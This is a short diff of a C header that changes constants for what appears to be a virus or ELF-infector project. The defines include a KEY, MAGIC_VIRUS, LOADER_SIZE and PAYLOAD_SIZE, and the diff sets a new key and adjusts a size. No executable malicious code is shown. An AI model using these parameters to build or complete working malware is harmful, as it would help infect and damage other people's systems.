@@ -12,14 +12,14 @@
 # include <fcntl.h>
 # include <limits.h>
 
-// # define KEY 0x12345678
+# define KEY 0x62F98A47
 # define SUB 0x95837523
 # define MAGIC_VIRUS 0x4E505241
 # define SIGN_SIZE 0x25
 
 # define FT_MEMCPY_ADDR 0x13e0
 # define BUF_SIZE 0x20
-# define BIS_SIZE 0x1d8
+# define BIS_SIZE 0x1d7
 # define LOADER_SIZE 0xca
 # define PAYLOAD_SIZE 0x3b55 - FT_MEMCPY_ADDR + 0x7
 # define MAIN_OFFSET 0x39cc - FT_MEMCPY_ADDR
